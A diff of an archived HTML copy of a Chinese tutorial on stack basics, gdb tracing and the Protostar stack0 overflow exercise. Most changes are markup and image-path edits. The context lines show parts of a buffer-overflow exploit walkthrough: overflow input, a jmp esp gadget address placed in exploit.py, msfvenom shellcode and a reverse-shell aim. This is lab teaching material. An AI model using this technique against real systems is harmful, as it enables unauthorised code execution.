@@ -3,14 +3,14 @@
 			<head>
 			     <title>二进制入门--动态跟踪源代码和反汇编代码 - quanyechavshuo</title>
 				 <meta http-equiv="content-type" content="text/html; charset=UTF-8">
-			</head>
+			<link rel="stylesheet" type="text/css" href="../stylesheets/stylesheet.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/github-dark.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/print.css" media="print"><style type="text/css">body {width: 90%;max-width: 960px;display: block;margin: 0 auto;}img {max-width: 900px;}</style><link rel="stylesheet" type="text/css" href="../stylesheets/stylesheet.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/github-dark.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/print.css" media="print"><style type="text/css">body {width: 90%;max-width: 960px;display: block;margin: 0 auto;}img {max-width: 900px;}</style></head>
 			<body>
 				<h1>原文地址:<a href="http://drops.wooyun.org/binary/16667">http://drops.wooyun.org/binary/16667</a></h1>
 				
       <p>
-        <h1>0x00 栈基础知识</h1>
+        </p><h1>0x00 栈基础知识</h1>
 
-<hr />
+<hr>
 
 <p><strong>1.</strong><a href="http://blog.chinaunix.net/uid-1848701-id-2825699.html">http://blog.chinaunix.net/uid-1848701-id-2825699.html</a></p>
 
@@ -32,7 +32,7 @@ eg.
 
 <p>执行call addr时，由于call addr已经执行,所以call addr=push eip+jmp addr中的eip为call addr汇编指令当前所在帧中的下一条指令的地址,这里说的当前所在帧是如下图frame所示在当前图片看到的一片汇编指令代码,如执行0xff77b8d02处的call 0xf77bc2e0时,eip为当前帧的下一条指令的地址为f77b8d07</p>
 
-<p><img src="http://static.wooyun.org//drops/20160613/2016061314050149873pic4.png" alt="p1" /></p>
+<p><img src="../images_result/images/2016061314050149873pic4.png" alt="p1"></p>
 
 <p><strong>5.leave===>mov esp,ebp + pop ebp</strong></p>
 
@@ -40,7 +40,7 @@ eg.
 
 <h1>0x01 gdb动态调度</h1>
 
-<hr />
+<hr>
 
 <p><strong>1.gdb常用调试命令</strong></p>
 
@@ -82,7 +82,7 @@ info f(info frame)   #查看当前栈帧信息
 
 <h1>0x02 实例分析</h1>
 
-<hr />
+<hr>
 
 <p><strong>link：</strong><a href="https://exploit-exercises.com/protostar/stack0/">https://exploit-exercises.com/protostar/stack0/</a></p>
 
@@ -221,7 +221,7 @@ line7,lin8代码：
 <li><p>上面3中说的非0是内存中的非0，如果是键盘上的0键并不是内存中的0,如下图ascii所示</p></li>
 </ol>
 
-<p><img src="http://static.wooyun.org//drops/20160613/2016061314045641961pic3.png" alt="p2" /></p>
+<p><img src="../images_result/images/2016061314045641961pic3.png" alt="p2"></p>
 
 <pre><code>#!bash
 line10:(line9是空格行)
@@ -244,7 +244,7 @@ line11:
 11        gets(buffer);
 0x08048405 &lt;+17&gt;:    lea    0x1c(%esp),%eax          #eax=esp+0x1c,0x1c=28(/4=7)=7个栈单元,对应图中序号6
 0x08048409 &lt;+21&gt;:    mov    %eax,(%esp)              #[esp]=eax,对应图中序号7,为了下面的call gets作准备--&gt;将func gets的参数“入栈”(放到对应的位置，不是push arg,没有esp=esp-4)
-0x0804840c &lt;+24&gt;:    call   0x804830c &lt;<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="fa9d9f8e89ba8a968e">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>&gt;     #上面一行[esp]=eax=addr,将buffer[64]的起始地址放入栈中准备给gets函数调用
+0x0804840c &lt;+24&gt;:    call   0x804830c &lt;<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="fa9d9f8e89ba8a968e">[email&#160;protected]</a><script data-cfhash="f9e31" type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>&gt;     #上面一行[esp]=eax=addr,将buffer[64]的起始地址放入栈中准备给gets函数调用
 -----------------------end-----------------------------
 
 stepi(0xffffd4ec被置0)
@@ -259,7 +259,7 @@ disas /m
 =&gt; 0x08048405 &lt;+17&gt;:    lea    0x1c(%esp),%eax     #这行左边的箭头表示运行到这行，也即eip=0x08048405,此时x $esp+0x5c ===&gt; 0xffffd4ec:  0x00000000
 
 0x08048409 &lt;+21&gt;:    mov    %eax,(%esp)         #此外，lea 0x1c(%esp),%eax(in att mode)&lt;==&gt;lea eax,[esp+0x1c](in intel mode)
-0x0804840c &lt;+24&gt;:    call   0x804830c &lt;<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="137476676053637f67">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>&gt;               
+0x0804840c &lt;+24&gt;:    call   0x804830c &lt;<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="137476676053637f67">[email&#160;protected]</a><script data-cfhash="f9e31" type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>&gt;               
 -------------end-----------
 
 set disassembly-flavor intel(upon output is the result of "set dissassembly-flavor att" on default)
@@ -267,7 +267,7 @@ set disassembly-flavor intel(upon output is the result of "set dissassembly-flav
 11        gets(buffer);
 =&gt; 0x08048405 &lt;+17&gt;:    lea    eax,[esp+0x1c]
 0x08048409 &lt;+21&gt;:    mov    DWORD PTR [esp],eax
-0x0804840c &lt;+24&gt;:    call   0x804830c &lt;<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="771012030437071b03">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>&gt;
+0x0804840c &lt;+24&gt;:    call   0x804830c &lt;<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="771012030437071b03">[email&#160;protected]</a><script data-cfhash="f9e31" type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>&gt;
 ------------------end----------------
 
 pay attention to eip part:(symbol "=&gt;" means eip is here)
@@ -275,7 +275,7 @@ pay attention to eip part:(symbol "=&gt;" means eip is here)
 11        gets(buffer);
 =&gt; 0x08048405 &lt;+17&gt;:    lea    eax,[esp+0x1c]           #将esp+0x1c的值赋给eax,eax=0xffffd4ac
 0x08048409 &lt;+21&gt;:    mov    DWORD PTR [esp],eax
-0x0804840c &lt;+24&gt;:    call   0x804830c &lt;<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="b6d1d3c2c5f6c6dac2">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>&gt;     #push 0x08048411,jmp func gets,对应图中序号8
+0x0804840c &lt;+24&gt;:    call   0x804830c &lt;<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="b6d1d3c2c5f6c6dac2">[email&#160;protected]</a><script data-cfhash="f9e31" type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>&gt;     #push 0x08048411,jmp func gets,对应图中序号8
 ------------end------------
 
 p $esp+0x1c          #print $esp+0x1c,打印$esp+0x1c变量的值
@@ -293,7 +293,7 @@ disas /m
 11        gets(buffer);
 0x08048405 &lt;+17&gt;:    lea    eax,[esp+0x1c]
 0x08048409 &lt;+21&gt;:    mov    DWORD PTR [esp],eax
-=&gt; 0x0804840c &lt;+24&gt;:    call   0x804830c &lt;<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="8deae8f9fecdfde1f9">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>&gt;
+=&gt; 0x0804840c &lt;+24&gt;:    call   0x804830c &lt;<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="8deae8f9fecdfde1f9">[email&#160;protected]</a><script data-cfhash="f9e31" type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>&gt;
 ----------end---------------
 
 x $eax
@@ -370,7 +370,7 @@ echo '1234567898123456789812345678981234567898123456789812345678981234\x00\x00\x
 
 <p>原题中要求改变modified位，直接输入键盘上的任意大于64位的一串字符即可，因为键盘上的数字0在内存中是0x30,如果将键盘上的0键输入到对应的modified位上，会改变modified</p>
 
-<p><img src="http://static.wooyun.org//drops/20160613/2016061314044685323pic2.png" alt="p3" /></p>
+<p><img src="../images_result/images/2016061314044685323pic2.png" alt="p3"></p>
 
 <p>该题要求溢出变量modified,也即覆盖栈中的modified所在的内在地址里的值，这里进行扩展，通过栈溢出反弹shell.</p>
 
@@ -505,7 +505,7 @@ si
 15        } else {
 16            printf("Try again?\n");
    0x08048427 &lt;+51&gt;:    movl   $0x8048529,(%esp)
-   0x0804842e &lt;+58&gt;:    call   0x804832c &lt;<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="29595c5d5a6959455d">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>&gt;
+   0x0804842e &lt;+58&gt;:    call   0x804832c &lt;<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="29595c5d5a6959455d">[email&#160;protected]</a><script data-cfhash="f9e31" type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>&gt;
 
 17        }
 18      }
@@ -673,7 +673,7 @@ Looking gadgets, please wait...
 
 <p>搜到jmp esp地址如下（由于本机kali为64位，所以显示成下图中样式，取其中32位的地址即可）</p>
 
-<p><img src="http://static.wooyun.org//drops/20160613/2016061314044215728pic1.png" alt="p4" /></p>
+<p><img src="../images_result/images/2016061314044215728pic1.png" alt="p4"></p>
 
 <p>取其中的0xf773813b,替换exploit.py中jmp_esp="\x3b\x81\x73\xf7",上图中选择的/lib/i386-linux-gnu/ld-2.19.so应该是随着操作系统启动加载到系统内存中的可用动态链接库文件</p>
 
@@ -686,7 +686,7 @@ aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa�
          91!z�ik\Dz��5�
 you have changed the 'modified' variable
 Segmentation fault (core dumped)
-┌─[<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="592b36362d1921693d3820">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>] - [~/桌面] - [Mon Jun 06, 07:53]
+┌─[<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="592b36362d1921693d3820">[email&#160;protected]</a><script data-cfhash="f9e31" type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>] - [~/桌面] - [Mon Jun 06, 07:53]
 └─[$] &lt;&gt; gdb -q -c core 
 [New LWP 7435]
 Core was generated by `./stack0'.
@@ -738,7 +738,7 @@ aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
          91!z�ik\Dz��5�
 you have changed the 'modified' variable
 Segmentation fault (core dumped)
-┌─[<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="32405d5d46724a0256534b">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>] - [~/桌面] - [Mon Jun 06, 08:33]
+┌─[<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="32405d5d46724a0256534b">[email&#160;protected]</a><script data-cfhash="f9e31" type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>] - [~/桌面] - [Mon Jun 06, 08:33]
 └─[$] &lt;&gt; gdb -q -c core 
 [New LWP 32688]
 Core was generated by `./stack0'.
@@ -935,9 +935,9 @@ No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RU
 
 <p>这样/tmp/stack0就是user用户的文件了，溢出时可以正常产生core文件,但是没有原来/opt/protostar/bin/stack0的suid=root属性</p>
 
-<p>开始一直是通过<code>ssh <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="730600160133424a415d42454b5d415d424747">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script></code>到protostar系统进行远程操作的，后来发现ssh登录时和直接在protostar系统中操作时不同，这两种情况下运行:python exploit.py 在内存中分配的地址不同</p>
+<p>开始一直是通过<code>ssh <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="730600160133424a415d42454b5d415d424747">[email&#160;protected]</a><script data-cfhash="f9e31" type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script></code>到protostar系统进行远程操作的，后来发现ssh登录时和直接在protostar系统中操作时不同，这两种情况下运行:python exploit.py 在内存中分配的地址不同</p>
 
-<p><code>ssh <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="a4d1d7c1d6e4959d968a95929c8a968a959090">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script></code>时shellcode的内存地址为0xbffff790<br />
+<p><code>ssh <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="a4d1d7c1d6e4959d968a95929c8a968a959090">[email&#160;protected]</a><script data-cfhash="f9e31" type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script></code>时shellcode的内存地址为0xbffff790<br>
 直接在protostar虚拟机中操作时shellcode的内存地址为0xbffff880</p>
 
 <p>后来以改为直接在protostar系统中操作,将jmp_esp的值改为"\x80\xf8\xff\xbf"</p>
@@ -1011,7 +1011,7 @@ os.system("echo '%s' | ./stack0" % input)
 <p>用同样的方法在kali上尝试溢出反弹shell,将protostar系统中的stack0复制到kali上</p>
 
 <pre><code>#!bash
-scp <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="1c696f796e5c2d252e322d2a24322f322d2c29">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>:/opt/protostar/bin/stack0 /root/桌面
+scp <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="1c696f796e5c2d252e322d2a24322f322d2c29">[email&#160;protected]</a><script data-cfhash="f9e31" type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>:/opt/protostar/bin/stack0 /root/桌面
 </code></pre>
 
 <p>用msfvenom重新生成shellcode:</p>
@@ -1158,7 +1158,7 @@ x/10x $esp
 -------------end--------------
 </code></pre>
 
-<p>从中发现这时shellcode的内存地址又变成了0xffa14160(上面[esp]后紧接的9个90证明了这点),不再是0xffd26180,可以看出kali的内存中没有固定的shellcode地址,每次shellcode地址都会变化，这应该是由于kali的内核版本高，安全性好造成的</p>      </p>
+<p>从中发现这时shellcode的内存地址又变成了0xffa14160(上面[esp]后紧接的9个90证明了这点),不再是0xffd26180,可以看出kali的内存中没有固定的shellcode地址,每次shellcode地址都会变化，这应该是由于kali的内核版本高，安全性好造成的</p>      <p></p>
     
 			</body>
 		</html>
